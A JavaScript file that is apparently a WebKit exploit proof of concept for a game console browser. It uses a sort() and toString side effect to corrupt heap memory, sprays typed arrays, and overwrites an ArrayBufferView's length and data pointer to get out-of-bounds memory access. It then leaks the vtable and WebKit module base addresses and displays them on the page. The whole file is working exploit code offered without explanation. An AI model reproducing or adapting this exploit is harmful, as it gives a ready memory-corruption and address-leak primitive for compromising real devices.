var start_offset, offset, offset2, index;
var heart, filler, arrays, cbuf, rop_buf;
var maxLenHeart, maxLenFiller;
var sce_buffer_address, sce_uint32_pointer_address, sce_vtable_address, sce_webkit_address;

var o = {};

maxLenHeart = 0x3000;
maxLenFiller = 0x800;

_dview = null;

function runPOC(debugInfo)
{
	if(debugInfo)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: I - Setting Up .sort() Bug";

	var spray = new Array(0x1000)
	for(var i = 0; i < spray.length;i++)
	{
	  spray[i] = new Uint32Array(0x1A7)
	}

	heart = Array.prototype.constructor.apply(null, new Array(maxLenHeart));
	filler = new Array(maxLenFiller);
	arrays = new Array(0x4);

	o.toString = function() {
	  heart.push(0x3039);

	  for(var i = 0; i < arrays.length; ++i)
	  {
	    var a = Array.prototype.constructor.apply(null, filler);
	    a[0] = 0;
	    a[1] = 1;
	    a[2] = 2;
	    arrays[i] = a;
	  }
	};

	heart[0] = o;

	var lenG = u2d(0x80000000, 0x80000000);
	for(var i = 1; i < heart.length; ++i)
	{
	  heart[i] = lenG;
	}

	heart.sort();
	o.toString = function() {};

	var u32buffer = new Array(0x100)
	for(var i = 0; i < 0x100; i++)
	{
	  var v = new Uint32Array(0x13AC)
	  for(var j = 0; j < v.length; j++)
	  {
	    if(j % 2 == 1)
	      v[j] = 0x41414141
	    else
	      v[j] = j;
	  }
	  u32buffer[i] = v
	}

	if(debugInfo)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: II - Finding ArrayBufferView in Memory...";

	arrayBufferView = arrays[1];

	start_offset = 0x2F000;
	offset = d2u(arrayBufferView[(start_offset) + 0x600 + (0xA00 * -40)]).low;
	offset2 = d2u(arrayBufferView[(start_offset) + 0x600 + (0xA00 * 30)]).low;
	index = 0;

	for(var i = 4; i < 100; i++)
	{
		var val = d2u(arrayBufferView[(start_offset) + 0x600 + (0xA00 * i) - offset / 2 - 1]).hi;

		if(val == 0xbadaeef7)
		{
			index = i;
			break;
		}
	}

	if(debugInfo)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: III - Modifying ArrayBufferView Object Size...";

	// Modify ArrayBufferView object size and make the buffer point to the ArrayBuffer field
	arrayBufferView[(start_offset) + 0x600 + (0xA00 * index) - offset2 / 2 + 7] = u2d(0x80000000, 0xbadbeef7);
	arrayBufferView[(start_offset) + 0x600 + (0xA00 * index) - offset2 / 2 + 2] = arrayBufferView[(start_offset) + 0x600 + (0xA00 * index) - offset2 / 2 + 4];

	for(var i = 0; i < u32buffer.length; i++)
	{
		if(u32buffer[i].length != 0x13AC)
	  {
	    // Modify the ArrayBuffer so it is larger and make it so it's m_data pointer points to the ArrayBufferViews
	    sce_buffer_address = new dcodeIO.Long(u32buffer[i][2],u32buffer[i][3],true);
	    sce_uint32_pointer_address = new dcodeIO.Long(u32buffer[i][6],u32buffer[i][7],true);

	    u32buffer[i][4] = (0x60000 * 4);

	    u32buffer[i][2] = sce_uint32_pointer_address.getLowBitsUnsigned();
	    u32buffer[i][3] = sce_uint32_pointer_address.getHighBitsUnsigned();

	    break;
	  }
	}

	if(debugInfo)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: IV - Finding Modified ArrayBuffer in Memory...";

	// Find our new ArrayBuffer and create a uint32 array from it
	for(var i = 0; i < u32buffer[i].length; i++)
	{
		if(u32buffer[i].buffer.byteLength != 0x4eb0)
		{
			cbuf = new Uint32Array(u32buffer[i].buffer);
			break;
		}
	}

	sce_vtable_address = new dcodeIO.Long(cbuf[0], cbuf[1], true);
	sce_webkit_address = sce_vtable_address.sub(0x2600d80);

	if(debugInfo)
		document.getElementById("codeExecutionStage").innerHTML = "Stage: Finished!";

	if(debugInfo)
	{
		document.getElementById("vtableAddress").innerHTML = "VTable Address: 0x" + sce_vtable_address.toString(16);
		document.getElementById("webkitAddress").innerHTML = "WebKit Module Base Address: 0x" + sce_webkit_address.toString(16);
		document.getElementById("bufferAddress").innerHTML = "Buffer Base Address: 0x" + sce_buffer_address.toString(16);
		document.getElementById("uint32Address").innerHTML = "Unsigned Int32 Address: 0x" + sce_uint32_pointer_address.toString(16);
	}
	else
	{
		document.getElementById("fwversion").innerHTML = "<strong>Firmware Version: </strong>" + ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
		document.getElementById("vtableAddress").innerHTML = "<strong>VTable Address:</strong> 0x" + sce_vtable_address.toString(16);
		document.getElementById("webkitAddress").innerHTML = "<strong>WebKit Module Base Address:</strong> 0x" + sce_webkit_address.toString(16);
		document.getElementById("bufferAddress").innerHTML = "<strong>Buffer Base Address:</strong> 0x" + sce_buffer_address.toString(16);
		document.getElementById("uint32Address").innerHTML = "<strong>Unsigned Int32 Address:</strong> 0x" + sce_uint32_pointer_address.toString(16);
	}

	if(debugInfo)
	{
		alert(
			"We've found information about your system through the exploit!" + "\r\n" +
			"vTable Address: 0x" + sce_vtable_address.toString(16) + "\r\n" +
			"WebKit Address: 0x" + sce_webkit_address.toString(16) + "\r\n" +
			"Buffer Address: 0x" + sce_buffer_address.toString(16) + "\r\n" +
			"UINT32 Address: 0x" + sce_uint32_pointer_address.toString(16)
		);
	}
}
